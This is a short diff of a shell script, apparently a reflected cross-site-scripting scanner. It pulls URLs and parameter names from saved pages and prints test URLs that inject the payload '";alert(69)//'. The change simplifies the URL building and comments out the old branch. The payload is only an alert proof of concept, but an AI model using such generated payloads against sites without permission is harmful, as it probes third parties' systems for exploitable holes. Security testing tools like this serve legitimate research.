@@ -11,12 +11,13 @@ do
 	url=$(cat $(echo "$line" | cut -d: -f1) | head -1 | awk '{print $4}')
 
 	varName=$(echo "$line" | awk '{print $2}' | cut -d= -f1)
-	if [ $(echo $url | awk -F"/" '{print NF}') -lt 4 ]
-	then
-		echo "$url/?$varName=\";alert(69)//"
-	else
-		echo "$url?$varName=\";alert(69)//"
-	fi
+	echo "$url?$varName=\";alert(69)//"
+	#if [ $(echo $url | awk -F"/" '{print NF}') -lt 4 ]
+	#then
+	#	echo "$url/?$varName=\";alert(69)//"
+	#else
+	#	echo "$url?$varName=\";alert(69)//"
+	#fi
 done < tmp
 cd .. && rm tmp && rm out -r
 echo "====================== ..DARY! ======================"
